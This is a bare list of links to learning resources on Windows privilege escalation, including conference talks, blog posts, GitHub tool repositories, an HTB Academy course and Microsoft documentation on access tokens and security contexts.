[Wild west hackin' Fest Jake Williams - Talk: Privilege Escalation](https://www.youtube.com/watch?v=yXe4X-AIbps)
[Udemy - tib3rius](https://www.udemy.com/user/tib3rius/)
[Casey Smith @Subtee/BoHop Talk](https://www.youtube.com/watch?v=3gz1QmiMhss) 
[Writeup of Talk by enigma0x3](https://enigma0x3.net/2017/08/03/wsh-injection-a-case-study/)
[Priv2Admin - Abusing Windows Privileges](https://github.com/gtworek/Priv2Admin)
[RogueWinRM Exploit](https://github.com/antonioCoco/RogueWinRM)
[Potatoes](https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html)
[Decoder's Blog](https://decoder.cloud/)
[Token Kidnapping](https://dl.packetstormsecurity.net/papers/presentations/TokenKidnapping.pdf)
[Hacktricks - Windows Local Privilege Escalation](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)
[LocalSystem](https://docs.microsoft.com/en-us/windows/win32/services/localsystem-account) 
[HTB academy Windows Privilege Escalation Course](https://academy.hackthebox.com/course/preview/windows-privilege-escalation)
[access-tokens](https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens) 
[security context](https://learn.microsoft.com/en-us/windows/desktop/SecGloss/s-gly)
[process](https://learn.microsoft.com/en-us/windows/desktop/SecGloss/p-gly) 